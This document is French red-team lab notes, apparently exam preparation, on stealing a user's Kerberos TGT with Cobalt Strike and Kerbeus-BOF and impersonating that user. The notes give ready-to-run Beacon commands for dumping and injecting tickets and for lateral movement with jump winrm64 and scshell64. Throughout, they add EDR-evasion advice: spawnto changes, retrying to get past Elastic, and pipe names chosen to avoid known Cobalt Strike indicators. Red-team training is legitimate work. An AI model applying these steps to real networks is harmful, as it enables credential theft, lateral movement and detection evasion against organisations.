# Lab — User Impersonation (usurpation d’identité)

> **Objectif :** récupérer le TGT d’un utilisateur depuis sa session de logon active et effectuer une impersonation pour accéder à ses ressources distantes sans connaître son mot de passe.

## Quand utiliser l’impersonation  

> Disposer d’un Beacon SYSTEM après Privilege Escalation  
> Puis récupérer le TGT → impersonation → accès distant
>Lateral Movement  
>Domain Dominance  

## Prérequis

⚠️ Charger le script Aggressor Kerbeus-BOF s’il ne l’est pas déjà :
```
CS → Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

## Vérifier le refus d’accès 

```cs
beacon> ls \\lon-ws-1\c$
```

## Énumération locale    

Depuis le Beacon SYSTEM, rechercher les processus exécutés sous l’identité de l’autre utilisateur :

```cs
ps

// Rechercher les processus dont l’utilisateur est CONTOSO\rsteel
// Exemples : cmd.exe, mmc.exe ou explorer.exe appartenant à rsteel

krb_triage
```

Rechercher l’utilisateur : `rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM`  

| LUID | Compte | Remarques |
|------|---------|-------|
| `0x3e7` | `lon-wkstn-1$` | Session SYSTEM — TGT du compte machine |
| `0x3e4` | `lon-wkstn-1$` | Session Network Service |
| Autre | Utilisateur du domaine | Logon interactif ou réseau — TGT utilisateur |

## Récupérer le TGT utilisateur  

```cs
krb_dump /user:rsteel /service:krbtgt
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Kerbeus-BOF utilise l’API Kerberos pour accéder aux tickets, sans `ReadProcessMemory` direct sur LSASS.
- Les notes indiquent une détection différente de Mimikatz `sekurlsa::tickets`, avec un accès indirect à LSASS.
- L’Event 4769 peut apparaître sur le DC lors d’une demande de service ticket, mais pas directement à cause de cette commande.
- Elastic EDR et Sysmon peuvent journaliser l’exécution du BOF via le processus Beacon.

Copier la valeur Base64 du ticket `.kirbi` depuis la sortie.

## Enregistrer le `.kirbi` sur l’Attacker Desktop

> Utiliser la valeur Base64 obtenue dans la commande PowerShell de l’Attacker Desktop :

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<paste-base64-here>"))
```

## Créer une session de logon temporaire  

```cs
make_token CONTOSO\rsteel FakePass
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Crée une session de logon de type 9 (NewCredentials) ; **Event 4648** enregistré selon les notes.
- Le mot de passe est fictif, sans validation par le DC.
- La session de logon est locale et sert à accueillir le ticket Kerberos injecté.
- L’Event 4648 peut associer `CONTOSO\rsteel` à la machine et être visible dans le SIEM.

**Pourquoi FakePass fonctionne :**
`make_token` avec la sémantique `/netonly` crée une session de logon sans valider les credentials localement. Le ticket injecté fournit l’authentification Kerberos, indépendamment du champ mot de passe.

## Injecter le TGT `.kirbi` dans la session  

```cs
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Utilise `LsaCallAuthenticationPackage` avec `KerbSubmitTicketMessage` pour injecter le ticket dans la session créée par `make_token`.
- Elastic EDR peut observer les appels aux API LSASS dans sa télémétrie.

## Vérifier le chargement du ticket

> Utiliser `powerpick` pour éviter le child process mentionné : OPSEC-🟠CAUTION. 
```cs
powerpick klist
```
## Accéder aux ressources distantes

```cs
ls \\lon-ws-1\c$
ls \\lon-dc-1\c$
```

### Terminer l’impersonation

```cs
beacon> rev2self
```

**Exécuter `rev2self` à la fin** : la session de logon reste ouverte, mais le token récupéré n’est plus utilisé. La session est purgée à la fermeture du Beacon.

---

## OPSEC — Comparaison steal_token / make_token

| | `steal_token` | `make_token` + `kerberos_ticket_use` |
|--|---|---|
| Niveau | 🟢SAFE | 🟠CAUTION |
| Event logon | Aucun | Event 4648 sur l’hôte local |
| Accès à LSASS | Aucun | API Kerberos via LSASS |
| Prérequis | Processus cible actif | TGT obtenu par `krb_dump` |
| Après la déconnexion utilisateur | Non | Oui, tant que le `.kirbi` reste valide |
| Priorité à l’examen | **À essayer d’abord** | Alternative |

----

# Aucun mot de passe en clair nécessaire

L’impersonation par token/ticket évite le cracking de hashes dans ce scénario. Kerberoasting reste une technique à connaître, mais le cracking n’est pas forcément indispensable.

| Objectif | Technique | Mot de passe en clair requis ? |
|------|-----------|-----------------|
| Lateral Movement | `steal_token` + `jump winrm64` | Non |
| Lateral Movement | `make_token` + `kerberos_ticket_use` + `jump winrm64` | Non — mot de passe fictif dans le contexte du lab |
| Lateral Movement NTLM | `pth` | Hash NTLM uniquement, pas de mot de passe en clair |
| Reconnaissance domaine | `ldapsearch` BOF | Non |
| Accès au partage distant | TGT récupéré + `kerberos_ticket_use` | Non |

**Cas où un mot de passe en clair est nécessaire :**
- RDP avec authentification par mot de passe (rare dans ce lab).
- Credential spraying si aucun ticket n’est disponible.

**Déroulement illustré :** `steal_token` → `jump winrm64` → nouveau Beacon sous l’identité utilisée. L’impersonation de token ou de ticket est présentée ici comme une alternative au cassage de hash, selon les droits disponibles.

---

## Lateral Movement — Jump après impersonation

> Ces méthodes s’utilisent **après** `steal_token` ou `make_token` + `kerberos_ticket_use`. Chaque technique possède son propre profil de détection.

### Préparation — Configurer spawnto avant le Jump

```cs
// Pour les jumps WinRM ou basés sur l’injection dans un processus distant
beacon> spawnto x64 %windir%\sysnative\werfault.exe

// Pour les jumps utilisant les services (scshell64, psexec64)
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

> Le `spawnto` par défaut est `rundll32.exe`, souvent surveillé par les EDR. Les notes recommandent de le configurer avant un Jump.

---

### Jump vers un hôte

> Utiliser `winrm64` si WinRM est actif sur la cible.  

```cs
beacon> powerpick Test-WSMan lon-ws-1       // vérifier la connectivité — OPSEC-🟢SAFE, sans processus enfant
beacon> jump winrm64 lon-ws-1 smb
```

| Propriété | Détail |
|----------|--------|
| Mécanisme | WinRM exécute le payload dans le contexte de `wsmprovhost.exe` |
| Service créé | Non |
| Événement 7045 | Non |
| Événement 4648 | Non dans le scénario `steal_token` décrit |
| Écriture disque | Non |
| Child process sur la source | Non |

**Observations EDR (lab du 19/04/2026) :**
Dans les observations du lab, `jump winrm64` génère le payload SMB lors de l’exécution. Elastic Endpoint aurait interrompu une première tentative (`ERROR_FILE_NOT_FOUND`), tandis qu’une seconde tentative aurait réussi. Ce résultat ponctuel ne garantit pas un comportement reproductible.

```
Attempt 1 → ERROR_FILE_NOT_FOUND  (Elastic killed beacon before pipe created)
Wait 10-15 seconds
Attempt 2 → established link      (payload executed inside EDR scan window gap)
```

Dans ce lab, `scshell64` figure comme une méthode alternative lorsque la méthode WinRM ne fonctionne pas.

---

### Méthode scshell64  

**Utilisé lorsque WinRM est désactivé ou que le payload est bloqué :** modifie un service existant, sans en créer de nouveau.

```cs
// Charger d’abord le fichier CNA s’il n’est pas déjà chargé :
// Cobalt Strike → Script Manager → Load → C:\Tools\SCShell\CS-BOF\scshell.cna

beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump scshell64 <target> <listener>
beacon> rev2self
```

| Propriété | Détail |
|----------|--------|
| Mécanisme | Modifie l’`ImagePath` d’un service existant via SCM RPC ; exécution sous SYSTEM dans le lab |
| Service créé | Non, modification d’un service existant |
| Événement 7045 | Non |
| Événement 7040 | **Oui** — modification de la configuration du service |
| Écriture disque | Non |
| Prérequis | Administrateur local sur la cible |

> SCShell restaure le chemin du service après l’exécution. L’événement 7040 peut alors être enregistré lors de la modification et du rétablissement. Ces opérations restent visibles dans les journaux.

---


### Comportement observé d’Elastic Endpoint (19/04/2026)

**Processus observés sur les hôtes du lab :** `elastic-agent.exe`, `elastic-endpoint.exe`, `MsMpEng.exe`, `Sysmon64.exe`

**Résultats winrm64 — Lab Unconstrained Delegation :**
- Le Beacon source s’est arrêté après `jump winrm64` ; Elastic surveillait déjà le processus Beacon dans cette instance.
- Hypothèse mentionnée dans les notes : le Beacon était déjà surveillé avant le Jump. Le résultat dépend de l’état de l’instance.
- Il ne s’agit pas d’une mesure fiable des capacités de WinRM : l’état de l’environnement influe sur le résultat.

**Résultats winrm64 — Lab Constrained Delegation (instance neuve) :**
- Tentative 1 avec `smb` (TSVCPIPE-*) : `ERROR_FILE_NOT_FOUND` ; dans le lab, Elastic a interrompu le Beacon avant la création de la named pipe.
- Tentative 2 (13 secondes plus tard) avec `smb` : `[+] established link` ; succès observé dans cette instance.
- `smb_custom` : `[+] established link` dès la première tentative ; la cause exacte n’a pas été déterminée.
- Conclusion de ces observations : le résultat varie selon l’état et le timing de l’environnement ; il ne constitue pas une règle générale.

**Résultats scshell64 :**
- La configuration `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe` était requise au préalable dans ce lab
- Le binaire `evil59.exe` a été écrit temporairement dans `\\target\C$\Windows\System32\`, puis supprimé automatiquement.
- Le chemin du service `defragsvc` a été modifié puis restauré (événement 7040 observé deux fois).
- Le Beacon a été établi dès la première tentative dans les deux instances observées. Ce résultat reste propre aux tests rapportés.
- Impact OPSEC observé : deux événements 7040 et une écriture temporaire dans System32.

**Conclusion sur la méthode d’authentification :** Dans les essais du lab, `steal_token` permettait l’authentification WinRM avec le contexte du processus ciblé. `make_token` seul, sans ticket Kerberos adapté, provoquait `ERROR_LOGON_FAILURE`.

**Conclusion sur les named pipes :** Les observations du lab suggèrent que le contenu du payload en mémoire joue un rôle plus important que le seul nom de la named pipe. L’évaluation OPSEC peut néanmoins tenir compte des artefacts réseau et des noms utilisés.

---

### Named Pipes SMB Listener — Examen

**Attention au nom `mojo.5688.8052.183894939787088877` :** il est présenté dans ces notes comme un indicateur connu de Cobalt Strike, au même titre que le préfixe `TSVCPIPE-*`. Cette affirmation mérite une vérification dans les sources de détection.

**Éviter ces noms : ce sont des IOCs Cobalt Strike documentés :**
```
TSVCPIPE-*       ← CS default
mojo.*           ← documented evasion technique since 2019
msagent_*        ← CS default
postex_*         ← CS default
MSSE-*-server    ← CS default
```

**Exemples de noms de named pipes cités dans les notes :**

```
CS → Listeners → Add (SMB) → Pipename field:

Option 1 — matches post-ex profile pipename pattern (consistent across all CS pipes):
  dotnet-diagnostic-#####
  (CS replaces each # with a random digit — different every session)

Option 2 — GUID format (generic, common in Windows IPC):
  ########-####-####-####-############

Option 3 — Windows service pipe pattern:
  wkssvc-########
  ntsvcs-########
```

> Dans Cobalt Strike, `#` sert de caractère générique remplacé lors de la création du listener. La valeur produite dépend du modèle choisi.

Le Malleable C2 Profile mentionné dans le lab définit `post-ex.pipename "dotnet-diagnostic-#####, ########-####-####-####-############"`. Vérifier la cohérence de cette configuration avec les règles de l’environnement de formation.
